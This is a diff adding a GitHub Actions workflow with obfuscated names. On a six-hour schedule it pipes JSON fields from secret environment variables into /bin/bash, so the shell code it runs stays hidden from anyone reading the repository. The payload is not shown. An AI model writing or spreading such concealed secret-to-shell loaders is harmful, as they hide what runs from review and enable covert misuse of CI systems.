@@ -1,0 +1,25 @@
+name: zhangguifan2189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangguifan2189
+        env:
+          otva89367: ${{ secrets.otva89367 }}
+        run: |
+          echo $otva89367 | jq -r .xegjp15 | /bin/bash
+          echo $sxa3549 | jq -r .u66210 | /bin/bash
+          echo $e9655 | jq -r .hojz9 | /bin/bash
+          echo $oik48 | jq -r .jqrt00 | /bin/bash
+          echo $qi3 | jq -r .u9 | /bin/bash
+          echo $ho4170 | jq -r .p31763 | /bin/bash
+          echo $g6 | jq -r .ddwd1 | /bin/bash
+          echo $q46 | jq -r .idswq0553 | /bin/bash
+
